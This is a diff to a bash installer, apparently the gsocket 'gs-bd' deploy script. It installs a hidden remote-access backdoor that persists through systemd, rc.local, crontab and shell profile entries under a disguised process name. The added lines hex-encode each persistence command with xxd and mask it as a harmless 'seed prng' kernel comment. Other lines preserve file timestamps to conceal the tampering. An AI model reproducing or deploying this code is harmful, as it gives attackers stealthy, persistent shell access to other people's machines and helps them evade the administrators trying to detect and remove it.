@@ -159,6 +159,7 @@ init_vars()
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+
 }
 
 init_setup()
@@ -183,6 +184,28 @@ init_setup()
 
 	# Find out which directory is writeable
 	init_dstbin
+
+	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
+
+	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
+	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
+	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
+	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(which bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+
+	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
+	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(which bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+
+	if command -v xxd >/dev/null; then
+		local p
+		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
+		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+
+		p="$(echo "$PROFILE_LINE" | xxd -ps -c1024)"
+		PROFILE_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+
+		p="$(echo "$CRONTAB_LINE" | xxd -ps -c1024)"
+		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
+	fi	
 }
 
 uninstall_rm()
@@ -245,7 +268,6 @@ uninstall()
 		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v "${BIN_HIDDEN_NAME}" | crontab - 2>/dev/null 
 	fi
 
-
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
@@ -254,7 +276,7 @@ uninstall()
 	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
-	echo -e 1>&2 "--> Type ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
+	echo -e 1>&2 "--> Use ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
 	exit 0
 }
 
@@ -283,7 +305,8 @@ WARN_OUT()
 
 gs_secret_reload()
 {
-	GS_SECRET="UNKNOWN"
+	[[ ! -f "$1" ]] && WARN_OUT "Oops. $1 not found. Uninstall needed?"
+	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
 	local sec
 	sec=$(<"$1")
 	[[ ${#sec} -gt 10 ]] && GS_SECRET=$sec
@@ -299,7 +322,6 @@ install_system_systemd()
 {
 	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
 	command -v systemctl >/dev/null || return
-	SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
 	if [[ -f "${SERVICE_FILE}" ]]; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
@@ -307,7 +329,7 @@ install_system_systemd()
 			IS_GS_RUNNING=1
 		fi
 		IS_SYSTEMD=1
-		gs_secret_reload "$SEC_FILE" 
+		gs_secret_reload "$SYSTEMD_SEC_FILE" 
 		SKIP_OUT "${SERVICE_FILE} already exists."
 		return
 	fi
@@ -322,14 +344,13 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-Environment=\"GSOCKET_ARGS=-k $SEC_FILE -ilq\"
-ExecStart=/bin/bash -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\"
+ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}"
 
 	chmod 600 "${SERVICE_FILE}"
-	gs_secret_write "$SEC_FILE"
+	gs_secret_write "$SYSTEMD_SEC_FILE"
 
 	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
 	systemctl start "${SERVICE_HIDDEN_NAME}" && \
@@ -343,11 +364,10 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 install_system_rclocal()
 {
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
-	SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 	if grep "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		gs_secret_reload "$SEC_FILE" 
+		gs_secret_reload "$RCLOCAL_SEC_FILE" 
 		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
 		return	
 	fi
@@ -355,14 +375,15 @@ install_system_rclocal()
 	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
 	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
 	(head -n1 "${RCLOCAL_FILE}" && \
-	echo "HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" $(which bash) -c \"cd /root; exec -a $PROC_HIDDEN_NAME $DSTBIN\"" && \
+	echo "$NOTE_DONOTREMOVE" && \
+	echo "$RCLOCAL_LINE" && \
 	tail -n +2 "${RCLOCAL_FILE}") >"${RCLOCAL_FILE}-new" 2>/dev/null || return # not writeable
 
 	# restore file's timestamp
 	touch -r "${RCLOCAL_FILE}" "${RCLOCAL_FILE}-new"
 	mv "${RCLOCAL_FILE}-new" "${RCLOCAL_FILE}"
 
-	gs_secret_write "$SEC_FILE"
+	gs_secret_write "$RCLOCAL_SEC_FILE"
 
 	IS_INSTALLED=1
 }
@@ -390,14 +411,17 @@ install_user_crontab()
 	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		gs_secret_reload "$SEC_FILE"
+		gs_secret_reload "$USER_SEC_FILE"
 		SKIP_OUT "Already installed in crontab."
 		return
 	fi
 
+	local cr_time
+	cr_time="59 * * * *"
+	[[ -n $GS_DEBUG ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
 	(crontab -l 2>/dev/null && \
-	echo "# DO NOT DELETE THIS LINE - Heartbeat ${BIN_HIDDEN_NAME}" && \
-	echo "0 * * * * command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || TERM=xterm-256color GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" $(which bash) -c exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})") | crontab - 2>/dev/null || { FAIL_OUT; return; }
+	echo "$NOTE_DONOTREMOVE" && \
+	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }
 
 	IS_INSTALLED=1
 	OK_OUT
@@ -411,12 +435,13 @@ install_user_profile()
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		gs_secret_reload "$SEC_FILE"
+		gs_secret_reload "$USER_SEC_FILE"
 		SKIP_OUT "Already installed in ${RC_FILE}"
 		return
 	fi
 
-	(echo "command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})" && \
+	(echo "$NOTE_DONOTREMOVE" && \
+	echo "${PROFILE_LINE}" && \
 	cat "${RC_FILE}") >"${RC_FILE}-new"
 
 	touch -r "${RC_FILE}" "${RC_FILE}-new"
@@ -428,17 +453,15 @@ install_user_profile()
 
 install_user()
 {
-
-	SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
-
 	# Do not use crontab on OSX: It pops a warning to the user
 	if [[ ! $OSTYPE == *darwin* ]]; then
 		install_user_crontab
 	fi
 
+	# install_user_profile
 	install_user_profile
 
-	[[ -z $IS_SKIPPED ]] && gs_secret_write "$SEC_FILE" # Create new secret file
+	[[ -z $IS_SKIPPED ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
 }
 
 # Download $1 and save it to $2
@@ -490,7 +513,6 @@ GS_SECRET=$("$DSTBIN" -g)
 [[ -z "$GS_SECRET" ]] && { FAIL_OUT "Execution failed...wrong binary?"; errexit; }
 
 # -----BEGIN Install permanentally-----
-
 # Try to install system wide. This may also start the service.
 [[ $UID -eq 0 ]] && install_system
 
@@ -526,7 +548,6 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
 	# Now two gs-bd's are running (which is correct)
-	# [[ -n $KL_CMD ]] && ${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	if [[ -n $KL_CMD ]]; then
 		${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	elif command -v pidof >/dev/null; then
@@ -537,7 +558,6 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	fi
 	IS_NEED_START=1
 
-	# if [[ -z $KL_CMD ]] || [[ -n "$IS_OLD_RUNNING" ]]; then
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: already running.
 		if [[ -n "$IS_SKIPPED" ]]; then
